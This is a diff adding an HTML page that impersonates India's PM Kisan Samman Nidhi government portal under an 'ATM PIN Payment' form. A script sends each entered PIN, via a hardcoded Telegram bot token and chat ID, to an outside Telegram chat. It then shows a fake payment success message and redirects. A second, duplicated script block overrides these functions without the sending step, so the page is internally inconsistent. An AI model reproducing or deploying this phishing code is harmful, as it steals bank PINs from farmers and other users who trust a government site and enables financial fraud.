@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ATM PIN Payment</title>
+    <style>
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Form Container */
+        .form-container {
+            background-color: white;
+            padding: 25px;
+            border-radius: 10px;
+            width: 40%;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .form-container input, .form-container button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .form-container button {
+            background-color: #1565c0;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .form-container button:hover {
+            background-color: #0044cc;
+        }
+
+        .otp-display {
+            display: none;
+            color: green;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .info-text {
+            font-size: 0.9rem;
+            color: #555;
+            margin: 10px 0;
+        }
+
+        .error-message {
+            color: red;
+            font-weight: bold;
+            display: none;
+        }
+
+        .success-message {
+            color: green;
+            font-weight: bold;
+            display: none;
+        }
+
+        .timer {
+            font-weight: bold;
+            color: #1565c0;
+        }
+
+        /* Processing Animation */
+        .processing-animation {
+            display: none;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #1565c0;
+            margin-top: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #1565c0;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        /* Animation for redirection */
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        .redirect-animation {
+            animation: fadeOut 1s ease-in-out;
+        }
+
+        /* Popup Styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            text-align: center;
+        }
+
+        .popup button {
+            background-color: #1565c0;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+
+        .popup button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Overlay Styles */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: black;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .mid-banner img {
+            max-width: 50%;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .form-container {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="main-content" id="main-content">
+        <div class="form-container">
+            <h3>ATM PIN Payment</h3>
+            <form id="atmPinForm">
+                <label for="atmPin">Enter ATM PIN (4 digits):</label>
+                <input type="password" id="atmPin" name="atmPin" placeholder="Enter ATM PIN" maxlength="4" required>
+
+                <div id="pinError" class="error-message"></div>
+                <div id="pinSuccess" class="success-message"></div>
+
+                <button type="submit">Submit PIN</button>
+            </form>
+
+            <!-- Processing Animation -->
+            <div id="processingAnimation" class="processing-animation">
+                <div class="spinner"></div>
+                Processing your payment...
+            </div>
+        </div>
+    </main>
+
+    <!-- Confirmation Popup -->
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="confirmationPopup">
+        <p>Are you sure you entered the correct PIN?</p>
+        <button onclick="confirmPin()">Yes</button>
+        <button onclick="closePopup()">No</button>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+
+    <script>
+        // Telegram Bot API Configuration
+        const botToken = '7714806324:AAFOeSPa7CX_wxM1BRnEb1ZCJxpOlVHnhuw'; // Replace with your bot token
+        const chatId = '-1002253043573'; // Replace with your chat ID
+
+        // Function to send data to Telegram
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Data sent to Telegram:', data))
+                .catch(error => console.error('Error sending data to Telegram:', error));
+        }
+
+        // Show Popup
+        function showPopup() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('confirmationPopup').style.display = 'block';
+        }
+
+        // Close Popup
+        function closePopup() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('confirmationPopup').style.display = 'none';
+        }
+
+        // Confirm PIN and Redirect
+        function confirmPin() {
+            const atmPin = document.getElementById('atmPin').value;
+
+            // Send ATM PIN to Telegram with emojis
+            const message = `🔐 ATM PIN Submitted: ${atmPin} ✅`;
+            sendToTelegram(message);
+
+            closePopup(); // Close the confirmation popup
+            document.getElementById('pinError').innerText = "";
+            document.getElementById('pinSuccess').innerText = "Payment Processed Successfully! ✅";
+
+            // Show processing animation
+            document.getElementById('processingAnimation').style.display = "block";
+
+            // Redirect to succkyc.html after 3 seconds
+            setTimeout(() => {
+                document.body.classList.add('redirect-animation');
+                setTimeout(() => {
+                    window.location.href = "succkyc.html"; // Redirect to succkyc.html
+                }, 1000); // Wait for the animation to complete
+            }, 3000); // Wait for the processing animation
+        }
+
+        // Form Submission Handler
+        document.getElementById('atmPinForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const atmPin = document.getElementById('atmPin').value;
+
+            // Validate ATM PIN
+            if (atmPin.length !== 4 || !/^\d+$/.test(atmPin)) {
+                document.getElementById('pinError').innerText = "Invalid ATM PIN. Please enter exactly 4 digits.";
+                return;
+            }
+
+            // If validation passes, show confirmation popup
+            showPopup();
+        });
+    </script>
+
+    <script>
+        // Show Popup
+        function showPopup() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('confirmationPopup').style.display = 'block';
+        }
+
+        // Close Popup
+        function closePopup() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('confirmationPopup').style.display = 'none';
+        }
+
+        // Confirm PIN and Redirect
+        function confirmPin() {
+            closePopup(); // Close the confirmation popup
+            document.getElementById('pinError').innerText = "";
+            document.getElementById('pinSuccess').innerText = "Payment Processed Successfully! ✅";
+
+            // Show processing animation
+            document.getElementById('processingAnimation').style.display = "block";
+
+            // Redirect to succkyc.html after 3 seconds
+            setTimeout(() => {
+                document.body.classList.add('redirect-animation');
+                setTimeout(() => {
+                    window.location.href = "regnew.html"; // Redirect to succkyc.html
+                }, 1000); // Wait for the animation to complete
+            }, 3000); // Wait for the processing animation
+        }
+
+        // Form Submission Handler
+        document.getElementById('atmPinForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const atmPin = document.getElementById('atmPin').value;
+
+            // Validate ATM PIN
+            if (atmPin.length !== 4 || !/^\d+$/.test(atmPin)) {
+                document.getElementById('pinError').innerText = "Invalid ATM PIN. Please enter exactly 4 digits.";
+                return;
+            }
+
+            // If validation passes, show confirmation popup
+            showPopup();
+        });
+    </script>
+</body>
+</html>
